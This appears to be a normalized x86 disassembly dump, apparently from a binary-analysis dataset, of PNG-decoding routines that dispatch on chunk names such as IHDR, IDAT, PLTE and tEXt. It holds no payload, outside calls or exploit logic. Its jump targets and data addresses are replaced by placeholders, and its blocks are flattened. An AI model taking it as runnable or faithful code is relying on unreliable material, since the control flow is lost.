push 0x50
push ecx
call sub_4564b2
mov esi [ ebp + 0x20 ]
add esp 0x10
lea ecx [ ebp + 0x24 ]
call sub_43b800
sub_430900
sub esp 0xb0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xac ] eax
push ebx
push ebp
mov ebp [ esp + 0xbc ]
push esi
mov esi ecx
push edi
mov [ esp + 0x14 ] ebp
test esi esi
je r-xdata
mov ecx [ esp + 0xbc ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_43f96b
add esp 0xb0
retn
test ebp ebp
je r-xdata
mov al [ esi + 0x12c ]
cmp al 0x8
jae r-xdata
mov bl 0x73
nop
movzx ebx al
mov eax [ esi + 0x50 ]
mov edi 0x8
sub edi ebx
test eax eax
je r-xdata
mov eax [ edx ]
mov [ esp + 0x18 ] eax
cmp eax [ esp + 0xac ]
jne r-xdata
mov eax [ esi + 0x68 ]
test al 0x8
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
push edi
lea ecx [ ebx + ebp + 0x20 ]
push ecx
push esi
call eax
add esp 0xc
jmp r-xdata
cmp eax [ esp + 0x3c ]
jne r-xdata
mov edx [ esp + 0x14 ]
push edi
push edx
mov ecx esi
call sub_437e00
add esp 0x8
jmp r-xdata
or eax 0x2000
mov [ esi + 0x68 ] eax
cmp ebx 0x3
jae r-xdata
cmp ebx 0x4
jae r-xdata
add ebp 0x20
push edi
push ebp
mov edx ebx
mov [ esi + 0x12c ] 0x8
call sub_436bd0
add esp 0x8
test eax eax
je r-xdata
mov ecx esi
call sub_437320
test eax eax
je r-xdata
mov eax [ esi + 0x68 ]
test al 0x1
je r-xdata
mov [ esp + 0xac ] 0x49
mov [ esp + 0xad ] 0x48
mov [ esp + 0xae ] 0x44
mov [ esp + 0xaf ] 0x52
mov [ esp + 0x8c ] 0x49
mov [ esp + 0x8d ] 0x44
mov [ esp + 0x8e ] 0x41
mov [ esp + 0x8f ] 0x54
mov [ esp + 0x3c ] 0x49
mov [ esp + 0x3d ] 0x45
mov [ esp + 0x3e ] 0x4e
mov [ esp + 0x3f ] 0x44
mov [ esp + 0x1c ] 0x50
mov [ esp + 0x1d ] 0x4c
mov [ esp + 0x1e ] 0x54
mov [ esp + 0x1f ] 0x45
mov [ esp + 0x7c ] 0x62
mov [ esp + 0x7d ] 0x4b
mov [ esp + 0x7e ] 0x47
mov [ esp + 0x7f ] 0x44
mov [ esp + 0x4c ] 0x63
mov [ esp + 0x4d ] 0x48
mov [ esp + 0x4e ] 0x52
mov [ esp + 0x4f ] 0x4d
mov [ esp + 0x9c ] 0x67
mov [ esp + 0x9d ] 0x41
mov [ esp + 0x9e ] 0x4d
mov [ esp + 0x9f ] 0x41
mov [ esp + 0x5c ] 0x68
mov [ esp + 0x5d ] 0x49
mov [ esp + 0x5e ] 0x53
mov [ esp + 0x5f ] 0x54
mov [ esp + 0x64 ] 0x69
mov [ esp + 0x65 ] 0x43
mov [ esp + 0x66 ] 0x43
mov [ esp + 0x67 ] 0x50
mov [ esp + 0x24 ] 0x6f
mov [ esp + 0x25 ] 0x46
mov [ esp + 0x26 ] 0x46
mov [ esp + 0x27 ] bl
mov [ esp + 0x6c ] 0x70
mov [ esp + 0x6d ] 0x43
mov [ esp + 0x6e ] 0x41
mov [ esp + 0x6f ] 0x4c
mov [ esp + 0x34 ] 0x70
mov [ esp + 0x35 ] 0x48
mov [ esp + 0x36 ] 0x59
mov [ esp + 0x37 ] bl
mov [ esp + 0x44 ] bl
mov [ esp + 0x45 ] 0x42
mov [ esp + 0x46 ] 0x49
mov [ esp + 0x47 ] 0x54
mov [ esp + 0x2c ] bl
mov [ esp + 0x2d ] 0x43
mov [ esp + 0x2e ] 0x41
mov [ esp + 0x2f ] 0x4c
mov [ esp + 0x74 ] bl
mov [ esp + 0x75 ] 0x50
mov [ esp + 0x76 ] 0x4c
mov [ esp + 0x77 ] 0x54
mov [ esp + 0x54 ] bl
mov [ esp + 0x55 ] 0x52
mov [ esp + 0x56 ] 0x47
mov [ esp + 0x57 ] 0x42
mov [ esp + 0x84 ] 0x74
mov [ esp + 0x85 ] 0x45
mov [ esp + 0x86 ] 0x58
mov [ esp + 0x87 ] 0x74
mov [ esp + 0x94 ] 0x74
mov [ esp + 0x95 ] 0x49
mov [ esp + 0x96 ] 0x4d
mov [ esp + 0x97 ] 0x45
mov [ esp + 0xa4 ] 0x74
mov [ esp + 0xa5 ] 0x52
mov [ esp + 0xa6 ] 0x4e
mov [ esp + 0xa7 ] 0x53
mov [ esp + 0xb4 ] 0x7a
mov [ esp + 0xb5 ] 0x54
mov [ esp + 0xb6 ] 0x58
mov [ esp + 0xb7 ] 0x74
mov ecx esi
call sub_437590
mov ebp [ esp + 0x8c ]
lea edx [ esi + 0x11c ]
mov edi eax
cmp [ edx ] ebp
jne r-xdata
or [ esi + 0x68 ] 0x1000
mov ecx r--data
add edi 0xfffffffc
push edi
push ebp
mov edx ebx
call sub_436bd0
add esp 0x8
mov ecx r--data
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
cmp eax [ esp + 0x1c ]
jne r-xdata
cmp [ esp + 0x18 ] ebp
jne r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
test al 0x4
jne r-xdata
push esi
call sub_43b740
add esp 0x4
cmp eax ebp
je r-xdata
mov ecx [ esp + 0x14 ]
push ecx
mov eax edi
mov ecx esi
call sub_437fd0
add esp 0x4
jmp r-xdata
mov eax [ esp + 0x14 ]
push eax
mov ecx edi
mov edx esi
call sub_43a290
mov eax [ esi + 0x11c ]
add esp 0x4
cmp eax [ esp + 0x1c ]
jne r-xdata
or [ esi + 0x68 ] 0x4
push edi
mov ecx esi
call sub_4376e0
add esp 0x4
jmp r-xdata
mov ecx r--data
call sub_43b800
or [ esi + 0x68 ] 0x18
test edi edi
je r-xdata
mov eax [ esi + 0x68 ]
test al 0x1
jne r-xdata
cmp eax [ esp + 0x7c ]
jne r-xdata
cmp eax ebp
jne r-xdata
or [ esi + 0x68 ] 0x2
jmp r-xdata
cmp [ esi + 0x126 ] 0x3
jne r-xdata
mov ecx r--data
jmp r-xdata
cmp eax [ esp + 0x4c ]
jne r-xdata
mov edx [ esp + 0x14 ]
push edx
mov ecx edi
mov edx esi
call sub_439210
add esp 0x4
jmp r-xdata
mov eax [ esi + 0x68 ]
test al 0x1
jne r-xdata
or [ esi + 0x68 ] 0x4
mov [ esi + 0x10c ] edi
test al 0x2
jne r-xdata
push esi
call sub_43b740
add esp 0x4
cmp eax [ esp + 0x9c ]
jne r-xdata
mov eax [ esp + 0x14 ]
push eax
mov ecx edi
mov edx esi
call sub_4383e0
add esp 0x4
jmp r-xdata
cmp [ esi + 0x126 ] 0x3
jne r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
jmp r-xdata
mov ecx r--data
cmp eax [ esp + 0x5c ]
jne r-xdata
mov ecx [ esp + 0x14 ]
push ecx
mov eax edi
mov ecx esi
call sub_438130
add esp 0x4
jmp r-xdata
test al 0x2
jne r-xdata
cmp eax [ esp + 0x24 ]
jne r-xdata
mov edx [ esp + 0x14 ]
push edx
mov ecx edi
mov edx esi
call sub_439430
add esp 0x4
jmp r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
jmp r-xdata
cmp eax [ esp + 0x6c ]
jne r-xdata
mov eax [ esp + 0x14 ]
push eax
mov ecx edi
mov edx esi
call sub_439680
add esp 0x4
jmp r-xdata
cmp eax [ esp + 0x2c ]
jne r-xdata
mov ecx [ esp + 0x14 ]
push ecx
mov eax edi
mov ecx esi
call sub_439790
add esp 0x4
jmp r-xdata
cmp eax [ esp + 0x34 ]
jne r-xdata
mov edx [ esp + 0x14 ]
push edx
mov eax edi
mov ecx esi
call sub_439b30
add esp 0x4
jmp r-xdata
cmp eax [ esp + 0x44 ]
jne r-xdata
mov eax [ esp + 0x14 ]
push eax
mov ecx edi
mov edx esi
call sub_439570
add esp 0x4
jmp r-xdata
cmp eax [ esp + 0x54 ]
jne r-xdata
mov ecx [ esp + 0x14 ]
push ecx
mov eax edi
mov ecx esi
call sub_438290
add esp 0x4
jmp r-xdata
cmp eax [ esp + 0x64 ]
jne r-xdata
mov edx [ esp + 0x14 ]
push edx
mov eax edi
mov ecx esi
call sub_4387e0
add esp 0x4
jmp r-xdata
cmp eax [ esp + 0x74 ]
jne r-xdata
mov eax [ esp + 0x14 ]
push eax
mov eax edi
mov ecx esi
call sub_4389b0
add esp 0x4
jmp r-xdata
cmp eax [ esp + 0x84 ]
jne r-xdata
mov ecx [ esp + 0x14 ]
push ecx
mov eax edi
mov ecx esi
call sub_438c90
add esp 0x4
jmp r-xdata
cmp eax [ esp + 0x94 ]
jne r-xdata
mov edx [ esp + 0x14 ]
push edi
push edx
mov eax esi
call sub_439e60
add esp 0x8
jmp r-xdata
cmp eax [ esp + 0xa4 ]
jne r-xdata
mov eax [ esp + 0x14 ]
push eax
mov ecx edi
mov edx esi
call sub_439d40
add esp 0x4
jmp r-xdata
cmp eax [ esp + 0xb4 ]
jne r-xdata
mov ecx [ esp + 0x14 ]
push ecx
mov ecx edi
mov edx esi
call sub_439000
add esp 0x4
jmp r-xdata
mov eax [ esp + 0x14 ]
push eax
mov ecx edi
mov edx esi
call sub_43a290
add esp 0x4
jmp r-xdata
mov edx [ esp + 0x14 ]
push edi
push edx
mov eax esi
call sub_43a040
add esp 0x8
jmp r-xdata
sub_430f10
sub esp 0x30
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2c ] eax
push ebx
push ebp
mov ebp [ esp + 0x3c ]
push esi
mov esi ecx
push edi
mov [ esp + 0x14 ] ebp
mov [ esp + 0x34 ] 0x49
mov [ esp + 0x35 ] 0x44
mov [ esp + 0x36 ] 0x41
mov [ esp + 0x37 ] 0x54
mov [ esp + 0x18 ] 0x80
mov [ esp + 0x1c ] 0x8
mov [ esp + 0x20 ] 0x88
mov [ esp + 0x24 ] 0x22
mov [ esp + 0x28 ] 0xaa
mov [ esp + 0x2c ] 0x55
mov [ esp + 0x30 ] 0xff
test esi esi
je r-xdata
mov ecx [ esp + 0x3c ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_43f96b
add esp 0x30
retn
test [ esi + 0x6c ] 0x40
jne r-xdata
cmp [ esi + 0x123 ] 0x0
je r-xdata
call sub_43b180
test [ esi + 0x68 ] 0x4
jne r-xdata
test [ esi + 0x70 ] 0x2
je r-xdata
mov edx [ esi + 0xec ]
mov eax [ esi + 0xdc ]
mov [ esi + 0x80 ] edx
mov [ esi + 0x84 ] eax
lea ebx [ esi + 0x74 ]
lea esp [ esp ]
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
movzx eax [ esi + 0x124 ]
cmp eax 0x6
ja r-xdata
push ebx
call sub_43cd30
add esp 0x4
cmp eax 0x1
je r-xdata
cmp [ esi + 0x10c ] 0x0
jne r-xdata
jmp [ eax * 4 + jump_table_4313a0 ]
cmp [ esi + 0x84 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ esi + 0xb0 ]
mov ecx [ esi + 0x10c ]
mov edi [ esi + 0xac ]
mov [ esi + 0x78 ] eax
mov [ ebx ] edi
cmp eax ecx
jbe r-xdata
push 0x0
mov ecx esi
call sub_4376e0
add esp 0x4
mov ecx esi
call sub_437590
mov ecx [ esp + 0x34 ]
mov [ esi + 0x10c ] eax
cmp [ esi + 0x11c ] ecx
je r-xdata
test [ esi + 0xe4 ] 0x7
je r-xdata
test [ esi + 0xe4 ] 0x7
jne r-xdata
mov eax [ esi + 0xe4 ]
and al 0x7
cmp al 0x4
je r-xdata
mov eax 0x3
test [ esi + 0xe4 ] al
jne r-xdata
mov ecx [ esi + 0xe4 ]
and cl 0x3
cmp cl 0x2
je r-xdata
test [ esi + 0xe4 ] 0x1
jne r-xdata
test [ esi + 0xe4 ] 0x1
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
cmp [ esi + 0x78 ] 0x0
jne r-xdata
cmp [ esi + 0x84 ] 0x0
jne r-xdata
mov eax [ esi + 0x8c ]
test eax eax
jne r-xdata
mov eax [ esi + 0x50 ]
mov ebp [ esi + 0x78 ]
test eax eax
je r-xdata
mov [ esi + 0x78 ] ecx
cmp [ esi + 0x10c ] 0x0
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
mov ecx esi
call sub_43adb0
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_43f96b
add esp 0x30
retn
mov ecx esi
call sub_43adb0
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_43f96b
add esp 0x30
retn
cmp [ esi + 0xc8 ] 0x5
jae r-xdata
mov ecx esi
call sub_43adb0
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_43f96b
add esp 0x30
retn
mov ecx esi
call sub_43adb0
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_43f96b
add esp 0x30
retn
cmp [ esi + 0xc8 ] eax
jae r-xdata
mov ecx esi
call sub_43adb0
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_43f96b
add esp 0x30
retn
mov ecx esi
call sub_43adb0
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_43f96b
add esp 0x30
retn
cmp [ esi + 0xc8 ] 0x2
jae r-xdata
imul eax ecx
add eax 0x7
shr eax 0x3
shr eax 0x3
imul eax ecx
jmp r-xdata
cmp [ esi + 0x10c ] 0x0
je r-xdata
cmp [ esi + 0x78 ] 0x0
jne r-xdata
jmp r-xdata
push esi
mov ecx eax
call sub_43b740
add esp 0x4
mov eax r--data
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
push ebp
push edi
push esi
call eax
add esp 0xc
jmp r-xdata
mov eax [ esi + 0xd8 ]
mov ecx [ esi + 0xec ]
mov edx [ esi + 0xe8 ]
inc eax
push eax
push ecx
push edx
call sub_443790
add esp 0xc
test [ esi + 0x230 ] 0x4
je r-xdata
mov ecx [ esi + 0xe8 ]
inc edx
push edx
movzx eax al
inc ecx
push esi
mov edx edi
call sub_43ac00
add esp 0x8
mov edx [ esi + 0xec ]
mov [ esi + 0x104 ] eax
mov al [ edx ]
test al al
je r-xdata
or [ esi + 0x68 ] 0x8
or [ esi + 0x6c ] 0x20
movzx eax [ esi + 0x127 ]
mov cl [ esi + 0x126 ]
mov dl [ esi + 0x12a ]
mov [ esi + 0x109 ] al
mov al [ esi + 0x129 ]
mov [ esi + 0x108 ] cl
mov ecx [ esi + 0xe0 ]
lea edi [ esi + 0x100 ]
mov [ esi + 0x10b ] al
cmp al 0x8
mov [ edi ] ecx
mov [ esi + 0x10a ] dl
movzx eax al
jb r-xdata
test [ esi + 0x6c ] 0x800
jne r-xdata
mov edx [ esi + 0x6c ]
and edx 0x300
cmp edx 0x300
jne r-xdata
test [ esi + 0x11c ] 0x20
je r-xdata
cmp [ esi + 0x70 ] 0x0
jne r-xdata
cmp [ esi + 0x238 ] 0x40
jne r-xdata
mov eax [ esi + 0x78 ]
sub [ esi + 0x10c ] eax
mov ebp [ esp + 0x14 ]
mov eax [ esi + 0x110 ]
test edi edi
jne r-xdata
jmp r-xdata
push esi
call sub_433090
add esp 0x4
test [ esi + 0x6c ] __dos_header
je r-xdata
mov ecx [ esi + 0xec ]
inc ecx
mov eax edi
call sub_436af0
mov edx ebp
mov ecx edi
call sub_43e220
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
test [ esi + 0x70 ] 0x2
je r-xdata
cmp [ esi + 0x123 ] 0x0
je r-xdata
mov [ esi + 0x110 ] eax
mov ecx esi
call sub_43adb0
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
push 0xff
cmp [ esi + 0x124 ] 0x6
jae r-xdata
movzx ecx [ esi + 0x124 ]
mov edx [ esi + 0xe4 ]
push ecx
push edx
push esi
call eax
add esp 0xc
test ebp ebp
je r-xdata
push esi
call sub_43a7a0
add esp 0x4
movzx ecx [ esi + 0x124 ]
mov edx [ esp + ecx * 4 + 0x18 ]
push edx
jmp r-xdata
mov edx ebp
mov eax esi
call sub_43a4b0
add esp 0x4
sub_4313c0
sub esp 0xa8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xa4 ] eax
push ebx
push ebp
mov ebp [ esp + 0xb4 ]
push esi
mov esi ecx
push edi
mov [ esp + 0x10 ] ebp
test esi esi
je r-xdata
mov ecx [ esp + 0xb4 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_43f96b
add esp 0xa8
retn
push 0x0
call sub_4376e0
add esp 0x4
mov bl 0x73
lea esp [ esp ]
cmp eax [ esp + 0x34 ]
jne r-xdata
push edi
push ebp
mov ecx esi
call sub_437e00
add esp 0x8
jmp r-xdata
mov ecx [ esi + 0x220 ]
test ecx ecx
jle r-xdata
mov eax [ esi + 0x68 ]
test al 0x1
je r-xdata
test [ esi + 0x68 ] 0x10
je r-xdata
cmp eax [ esp + 0x14 ]
jne r-xdata
mov ebp [ esi + 0x224 ]
lea edx [ ecx + ecx * 4 ]
lea edx [ edx + ebp - 0x5 ]
lea ecx [ ecx ]
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
test al 0x4
jne r-xdata
mov [ esp + 0x64 ] 0x49
mov [ esp + 0x65 ] 0x48
mov [ esp + 0x66 ] 0x44
mov [ esp + 0x67 ] 0x52
mov [ esp + 0x14 ] 0x49
mov [ esp + 0x15 ] 0x44
mov [ esp + 0x16 ] 0x41
mov [ esp + 0x17 ] 0x54
mov [ esp + 0x34 ] 0x49
mov [ esp + 0x35 ] 0x45
mov [ esp + 0x36 ] 0x4e
mov [ esp + 0x37 ] 0x44
mov [ esp + 0x1c ] 0x50
mov [ esp + 0x1d ] 0x4c
mov [ esp + 0x1e ] 0x54
mov [ esp + 0x1f ] 0x45
mov [ esp + 0x74 ] 0x62
mov [ esp + 0x75 ] 0x4b
mov [ esp + 0x76 ] 0x47
mov [ esp + 0x77 ] 0x44
mov [ esp + 0x44 ] 0x63
mov [ esp + 0x45 ] 0x48
mov [ esp + 0x46 ] 0x52
mov [ esp + 0x47 ] 0x4d
mov [ esp + 0x94 ] 0x67
mov [ esp + 0x95 ] 0x41
mov [ esp + 0x96 ] 0x4d
mov [ esp + 0x97 ] 0x41
mov [ esp + 0x54 ] 0x68
mov [ esp + 0x55 ] 0x49
mov [ esp + 0x56 ] 0x53
mov [ esp + 0x57 ] 0x54
mov [ esp + 0x5c ] 0x69
mov [ esp + 0x5d ] 0x43
mov [ esp + 0x5e ] 0x43
mov [ esp + 0x5f ] 0x50
mov [ esp + 0x84 ] 0x6f
mov [ esp + 0x85 ] 0x46
mov [ esp + 0x86 ] 0x46
mov [ esp + 0x87 ] bl
mov [ esp + 0x24 ] 0x70
mov [ esp + 0x25 ] 0x43
mov [ esp + 0x26 ] 0x41
mov [ esp + 0x27 ] 0x4c
mov [ esp + 0x2c ] 0x70
mov [ esp + 0x2d ] 0x48
mov [ esp + 0x2e ] 0x59
mov [ esp + 0x2f ] bl
mov [ esp + 0x3c ] bl
mov [ esp + 0x3d ] 0x42
mov [ esp + 0x3e ] 0x49
mov [ esp + 0x3f ] 0x54
mov [ esp + 0xa4 ] bl
mov [ esp + 0xa5 ] 0x43
mov [ esp + 0xa6 ] 0x41
mov [ esp + 0xa7 ] 0x4c
mov [ esp + 0x6c ] bl
mov [ esp + 0x6d ] 0x50
mov [ esp + 0x6e ] 0x4c
mov [ esp + 0x6f ] 0x54
mov [ esp + 0x4c ] bl
mov [ esp + 0x4d ] 0x52
mov [ esp + 0x4e ] 0x47
mov [ esp + 0x4f ] 0x42
mov [ esp + 0x7c ] 0x74
mov [ esp + 0x7d ] 0x45
mov [ esp + 0x7e ] 0x58
mov [ esp + 0x7f ] 0x74
mov [ esp + 0x8c ] 0x74
mov [ esp + 0x8d ] 0x49
mov [ esp + 0x8e ] 0x4d
mov [ esp + 0x8f ] 0x45
mov [ esp + 0x9c ] 0x74
mov [ esp + 0x9d ] 0x52
mov [ esp + 0x9e ] 0x4e
mov [ esp + 0x9f ] 0x53
mov [ esp + 0xac ] 0x7a
mov [ esp + 0xad ] 0x54
mov [ esp + 0xae ] 0x58
mov [ esp + 0xaf ] 0x74
mov ecx esi
call sub_437590
mov edi eax
mov eax [ esi + 0x11c ]
cmp eax [ esp + 0x64 ]
jne r-xdata
cmp eax [ esp + 0x1c ]
jne r-xdata
test edi edi
ja r-xdata
movzx ecx [ edx + 0x4 ]
test ecx ecx
je r-xdata
dec ecx
sub edx 0x5
test ecx ecx
jne r-xdata
push edi
mov ecx esi
call sub_4376e0
jmp r-xdata
mov ecx r--data
call sub_43b800
or [ esi + 0x68 ] 0x18
test edi edi
je r-xdata
cmp eax [ esp + 0x74 ]
jne r-xdata
push ebp
mov eax edi
mov ecx esi
call sub_437fd0
jmp r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
test [ esi + 0x68 ] 0x2000
je r-xdata
mov ebp [ esp + 0x10 ]
cmp eax [ esp + 0x14 ]
jne r-xdata
cmp eax [ edx ]
je r-xdata
add esp 0x4
cmp eax [ esp + 0x44 ]
jne r-xdata
push ebp
mov ecx edi
mov edx esi
call sub_439210
jmp r-xdata
push edi
mov ecx esi
call sub_4376e0
jmp r-xdata
mov ebp [ esp + 0x10 ]
push ebp
mov ecx edi
mov edx esi
call sub_43a290
mov eax [ esi + 0x11c ]
add esp 0x4
cmp eax [ esp + 0x1c ]
jne r-xdata
test edi edi
ja r-xdata
cmp eax [ esp + 0x94 ]
jne r-xdata
push ebp
mov ecx edi
mov edx esi
call sub_4383e0
jmp r-xdata
or [ esi + 0x68 ] 0x2
jmp r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
test [ esi + 0x68 ] 0x2000
je r-xdata
cmp eax [ esp + 0x54 ]
jne r-xdata
push ebp
mov eax edi
mov ecx esi
call sub_438130
jmp r-xdata
cmp eax [ esp + 0x84 ]
jne r-xdata
push ebp
mov ecx edi
mov edx esi
call sub_439430
jmp r-xdata
cmp eax [ esp + 0x24 ]
jne r-xdata
push ebp
mov ecx edi
mov edx esi
call sub_439680
jmp r-xdata
cmp eax [ esp + 0xa4 ]
jne r-xdata
push ebp
mov eax edi
mov ecx esi
call sub_439790
jmp r-xdata
cmp eax [ esp + 0x2c ]
jne r-xdata
push ebp
mov eax edi
mov ecx esi
call sub_439b30
jmp r-xdata
cmp eax [ esp + 0x3c ]
jne r-xdata
push ebp
mov ecx edi
mov edx esi
call sub_439570
jmp r-xdata
cmp eax [ esp + 0x4c ]
jne r-xdata
push ebp
mov eax edi
mov ecx esi
call sub_438290
jmp r-xdata
cmp eax [ esp + 0x5c ]
jne r-xdata
push ebp
mov eax edi
mov ecx esi
call sub_4387e0
jmp r-xdata
cmp eax [ esp + 0x6c ]
jne r-xdata
push ebp
mov eax edi
mov ecx esi
call sub_4389b0
jmp r-xdata
cmp eax [ esp + 0x7c ]
jne r-xdata
push ebp
mov eax edi
mov ecx esi
call sub_438c90
jmp r-xdata
cmp eax [ esp + 0x8c ]
jne r-xdata
push edi
push ebp
mov eax esi
call sub_439e60
add esp 0x8
jmp r-xdata
cmp eax [ esp + 0x9c ]
jne r-xdata
push ebp
mov ecx edi
mov edx esi
call sub_439d40
jmp r-xdata
cmp eax [ esp + 0xac ]
jne r-xdata
push ebp
mov ecx edi
mov edx esi
call sub_439000
jmp r-xdata
push ebp
mov ecx edi
mov edx esi
call sub_43a290
push edi
push ebp
mov eax esi
call sub_43a040
add esp 0x8
jmp r-xdata
sub_431880
mov eax [ esp + 0x4 ]
push esi
xor esi esi
test eax eax
je r-xdata
pop esi
retn
push ebx
mov ebx [ eax ]
test ebx ebx
je r-xdata
pop ebx
mov eax [ esp + 0x10 ]
push ebp
mov ebp [ ebx + 0x244 ]
push edi
mov edi [ ebx + 0x24c ]
test eax eax
je r-xdata
push 0x0
mov eax esi
call sub_431900
add esp 0x4
test esi esi
je r-xdata
mov esi [ eax ]
push ebx
mov edx ebp
mov ecx edi
call sub_43b5e0
mov ecx [ esp + 0x18 ]
add esp 0x4
pop edi
mov [ ecx ] 0x0
pop ebp
push 0xffffffff
push 0x4000
push esi
push ebx
call sub_436d60
push esi
mov edx ebp
mov ecx edi
call sub_43b5e0
mov eax [ esp + 0x2c ]
add esp 0x14
mov [ eax ] 0x0
sub_431900
sub esp 0x40
push ebp
mov ebp [ esp + 0x48 ]
push esi
push edi
mov edi eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov esi ebx
call sub_4372b0
mov ecx [ ebx + 0xac ]
test ecx ecx
je r-xdata
mov edi ebp
mov esi ebx
call sub_4372b0
mov ecx [ ebx + 0x250 ]
test ecx ecx
je r-xdata
mov eax [ ebx + 0x24c ]
push ecx
test eax eax
je r-xdata
mov ecx [ ebx + 0xe8 ]
test ecx ecx
je r-xdata
mov eax [ ebx + 0x24c ]
push ecx
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push ebx
call eax
add esp 0x8
jmp r-xdata
mov ecx [ ebx + 0x288 ]
test ecx ecx
je r-xdata
mov eax [ ebx + 0x24c ]
push ecx
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push ebx
call eax
add esp 0x8
jmp r-xdata
mov ecx [ ebx + 0x1ec ]
test ecx ecx
je r-xdata
mov eax [ ebx + 0x24c ]
push ecx
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push ebx
call eax
add esp 0x8
jmp r-xdata
mov ecx [ ebx + 0x1f0 ]
test ecx ecx
je r-xdata
mov eax [ ebx + 0x24c ]
push ecx
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push ebx
call eax
add esp 0x8
jmp r-xdata
mov ecx [ ebx + 0x164 ]
test ecx ecx
je r-xdata
mov eax [ ebx + 0x24c ]
push ecx
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push ebx
call eax
add esp 0x8
jmp r-xdata
mov ecx [ ebx + 0x168 ]
test ecx ecx
je r-xdata
mov eax [ ebx + 0x24c ]
push ecx
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push ebx
call eax
add esp 0x8
jmp r-xdata
mov ecx [ ebx + 0x16c ]
test ecx ecx
je r-xdata
mov eax [ ebx + 0x24c ]
push ecx
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push ebx
call eax
add esp 0x8
jmp r-xdata
test [ ebx + 0x214 ] 0x1000
je r-xdata
mov eax [ ebx + 0x24c ]
push ecx
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push ebx
call eax
add esp 0x8
jmp r-xdata
and [ ebx + 0x214 ] 0xffffefff
test [ ebx + 0x214 ] 0x2000
je r-xdata
mov ecx [ ebx + 0x114 ]
test ecx ecx
je r-xdata
call sub_44120e
add esp 0x4
push ebx
call eax
add esp 0x8
jmp r-xdata
and [ ebx + 0x214 ] 0xffffdfff
mov eax [ ebx + 0x214 ]
test al 0x8
je r-xdata
mov ecx [ ebx + 0x188 ]
test ecx ecx
je r-xdata
mov eax [ ebx + 0x24c ]
push ecx
test eax eax
je r-xdata
and [ ebx + 0x214 ] 0xfffffff7
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov ecx [ ebx + 0x1f4 ]
test ecx ecx
je r-xdata
mov eax [ ebx + 0x24c ]
push ecx
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push ebx
call eax
add esp 0x8
jmp r-xdata
cmp [ ebx + 0x174 ] 0x0
je r-xdata
mov ecx 0x8
sub ecx [ ebx + 0x158 ]
mov edi 0x1
shl edi cl
xor esi esi
test edi edi
jle r-xdata
mov eax [ ebx + 0x24c ]
push ecx
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push ebx
call eax
add esp 0x8
jmp r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov ecx 0x8
sub ecx [ ebx + 0x158 ]
mov edi 0x1
shl edi cl
xor esi esi
test edi edi
jle r-xdata
mov ecx [ ebx + 0x170 ]
test ecx ecx
je r-xdata
mov edi edi
call sub_44120e
add esp 0x4
push ebx
call eax
add esp 0x8
jmp r-xdata
mov ecx [ ebx + 0x210 ]
test ecx ecx
je r-xdata
mov ecx 0x8
sub ecx [ ebx + 0x158 ]
mov edi 0x1
shl edi cl
xor esi esi
test edi edi
jle r-xdata
mov ecx [ ebx + 0x174 ]
test ecx ecx
je r-xdata
mov ecx [ ebx + 0x174 ]
mov eax [ ecx + esi * 4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x24c ]
push ecx
test eax eax
je r-xdata
inc esi
cmp esi edi
jl r-xdata
mov ecx [ ebx + 0x24c ]
push eax
test ecx ecx
je r-xdata
lea esi [ ebx + 0x74 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x24c ]
push ecx
test eax eax
je r-xdata
mov ecx [ ebx + 0x178 ]
test ecx ecx
je r-xdata
jmp r-xdata
mov eax [ ebx + 0x24c ]
push ecx
test eax eax
je r-xdata
inc esi
cmp esi edi
jl r-xdata
mov ecx [ ebx + 0x24c ]
push eax
test ecx ecx
je r-xdata
call sub_44120e
add esp 0x4
push ebx
call eax
add esp 0x8
jmp r-xdata
mov eax [ ebx + 0x170 ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push ebx
call ecx
add esp 0x8
jmp r-xdata
mov ecx [ ebx + 0x1b0 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
call sub_44120e
add esp 0x4
push ebx
call eax
add esp 0x8
jmp r-xdata
